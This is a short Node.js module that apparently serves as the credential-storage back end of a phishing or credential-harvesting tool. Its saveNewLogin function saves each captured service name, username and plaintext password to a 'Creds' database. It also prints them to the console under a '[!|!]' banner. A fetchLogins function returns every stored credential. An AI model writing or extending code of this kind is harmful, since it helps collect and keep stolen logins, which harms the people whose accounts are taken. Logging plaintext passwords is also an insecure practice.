const chalk = require('chalk');

const index = require('../index');
const driver = require('./driver');

/**
 * Saves a new login for a specific service
 * @param {String} serviceName 
 * @param {String} username 
 * @param {String} password 
 */
exports.saveNewLogin = function (serviceName, username, password) {
    if (index.usingDatabase) {
        let newLogin = new driver.getModals().Creds({
            username: username,
            password: password,
            service: serviceName
        });
        newLogin.save();
    }
    console.info(`${chalk.green(`[!${chalk.red('|')}!]`)} New login from ${chalk.green(serviceName)} - Username: ${chalk.red(username)} Password: ${chalk.red(password)}`);
};

/**
 * Returns the list of logins for a specific service
 * @returns List of logins
 */
exports.fetchLogins = async function() {
    let logins = await driver.getModals().Creds.fetch({});
    return logins;
}